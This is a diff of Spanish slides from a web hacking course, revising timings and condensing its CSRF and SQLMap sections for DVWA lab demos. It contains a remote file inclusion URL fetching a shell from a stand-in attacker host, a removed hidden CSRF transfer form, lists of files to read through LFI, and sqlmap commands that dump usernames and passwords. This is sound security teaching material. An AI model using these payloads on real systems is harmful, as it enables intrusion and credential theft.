@@ -1,7 +1,7 @@
 # Deck — Clase 1 · Módulo 2
 
 > Curso de Web Hacking
-> Duración: ~1h30m (primera mitad de Clase 3)
+> Duración: ~1h58m (primera mitad de Clase 3)
 > Formato: teoría + demos guiadas
 
 ---
@@ -49,11 +49,11 @@ Ejemplos:
 
 | Bloque | Contenido | Tiempo aprox. |
 |---|---|---|
-| **1** | Command Injection + File Inclusion + CSRF | ~35 min |
+| **1** | Command Injection + File Inclusion + CSRF | ~25 min |
 | 🧪 | Demo 1: Command Injection en DVWA | ~15 min |
 | **2** | SQL Injection: fundamentos y explotación manual | ~40 min |
 | 🧪 | Demo 2: SQLi guiada en DVWA | ~20 min |
-| **3** | SQLMap: automatización con criterio | ~20 min |
+| **3** | SQLMap: automatización con criterio | ~8 min |
 | 🧭 | Proyecto integrador y cierre | ~10 min |
 
 ---
@@ -153,9 +153,9 @@ http://target/page.php?file=http://attacker.com/shell.php
 
 ---
 
-## File Inclusion: encadenamiento
+## File Inclusion: encadenamiento y CSRF
 
-Cadena de ataque típica:
+Cadena de ataque típica (File Inclusion):
 1. Subida de archivo sin validación real
 2. LFI para incluir/ejecutar el archivo subido
 3. Ejecución de código en el servidor
@@ -169,31 +169,10 @@ Archivos interesantes para LFI:
 | Windows | `C:\Windows\win.ini`, `C:\boot.ini` |
 | App | `config.php`, `.env`, `web.xml` |
 
----
-
-## CSRF (Cross-Site Request Forgery)
-
-CSRF no necesita robar la sesión.
-
-Aprovecha que el navegador:
-- ya está autenticado
-- envía cookies automáticamente
-
-Si la app no valida origen/intención, un atacante puede forzar acciones:
-- cambiar contraseña
-- modificar perfil
-- transferir dinero
-- aprobar operaciones
-
-Ejemplo de formulario malicioso:
-
-```html
-<form action="http://bank.com/transfer" method="POST">
-  <input type="hidden" name="to" value="attacker">
-  <input type="hidden" name="amount" value="10000">
-</form>
-<script>document.forms[0].submit();<\/script>
-```
+**CSRF (Cross-Site Request Forgery):**
+- No necesita robar la sesión: abusa de que el navegador ya está autenticado y envía cookies automáticamente
+- Si la app no valida origen/intención, un atacante fuerza acciones (cambiar contraseña, transferir dinero) con un `<form>` oculto que se auto-envía
+- Mitigación: tokens anti-CSRF, `SameSite`, validación de origen
 
 ---
 
@@ -420,66 +399,25 @@ SQLMap automatiza:
 - extracción de datos
 - bypass de WAFs
 
-Estructura base:
+Comando básico:
 
 ```bash
-sqlmap -u "http://target/product.php?id=1"
+sqlmap -u "http://target/product.php?id=1" --batch
+```
+
+Ejemplo de flujo resumido (detectar → enumerar bases → dump selectivo):
+
+```bash
+sqlmap -u "http://target/page.php?id=1" --batch                            # 1. Detectar
+sqlmap -u "http://target/page.php?id=1" --dbs --batch                      # 2. Enumerar bases
+sqlmap -u "http://target/page.php?id=1" -D webapp -T users \
+  -C "username,password" --dump --batch                                   # 3. Dump
 ```
 
 Pero automatizar no significa apagar el criterio.
 
----
-
-## SQLMap: flags esenciales
-
-| Opción | Función |
-|---|---|
-| `-u URL` | URL con parámetro inyectable |
-| `--data="user=x&pass=y"` | POST data |
-| `--cookie="PHPSESSID=abc"` | Cookie de sesión |
-| `--technique=BEUSTQ` | Técnicas a probar |
-| `--level=1-5` | Profundidad de pruebas |
-| `--risk=1-3` | Riesgo (1=safe, 3=agresivo) |
-| `--batch` | No interactivo |
-| `--dbs` | Enumerar bases de datos |
-| `-D nombre --tables` | Tablas de una base |
-| `-D nombre -T tabla --dump` | Extraer datos |
-
----
-
-## SQLMap: flujo práctico completo
-
-```bash
-# 1. Detectar inyección
-sqlmap -u "http://target/page.php?id=1" --batch
-
-# 2. Enumerar bases de datos
-sqlmap -u "http://target/page.php?id=1" --dbs --batch
-
-# 3. Enumerar tablas de una base
-sqlmap -u "http://target/page.php?id=1" -D webapp --tables --batch
-
-# 4. Extraer columnas
-sqlmap -u "http://target/page.php?id=1" -D webapp -T users --columns --batch
-
-# 5. Dump selectivo
-sqlmap -u "http://target/page.php?id=1" -D webapp -T users \
-  -C "username,password" --dump --batch
-
-# 6. Con POST y cookie
-sqlmap -u "http://target/login" --data="user=test&pass=test" \
-  --cookie="session=abc123" --level=3 --risk=2 --batch
-```
-
----
-
-## SQLMap: buenas prácticas
-
-1. **Confirmar manualmente antes** — si no entendés la falla, SQLMap tampoco la va a explicar
-2. **Empezar con level=1, risk=1** — subir solo si no detecta
-3. **Extraer solo lo necesario** — `--dump` sin filtros puede tardar horas
-4. **Guardar evidencia** — usar `--output-dir`
-5. **No usar en producción sin autorización** — genera cientos de requests ruidosos
+> Flags completos, flujo paso a paso (6 pasos) y buenas prácticas → `comandos sqlmap.md`.
+> Los vas a necesitar para el Proyecto integrador.
 
 ---
 
